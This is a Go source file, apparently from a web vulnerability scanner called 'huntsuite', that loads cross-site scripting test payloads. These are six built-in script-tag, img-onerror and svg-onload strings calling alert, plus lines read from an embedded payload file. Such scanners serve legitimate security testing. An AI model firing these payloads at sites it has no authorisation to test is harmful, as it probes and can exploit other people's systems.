package scanner

import (
	_ "embed"
	"strings"
)

//go:embed xss_payloads.txt
var rawXSSPayloads string

func loadXSSPayloads() []string {
	base := []string{
		"<script>alert(1)</script>",
		"\"><script>alert('huntsuite')</script>",
		"'><script>alert(1)</script>",
		"<sCrIpT>alert(1)</ScRiPt>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
	}

	if rawXSSPayloads == "" {
		return base
	}

	for _, line := range strings.Split(rawXSSPayloads, "\n") {
		payload := strings.TrimSuffix(line, "\r")
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		base = append(base, payload)
	}

	return base
}
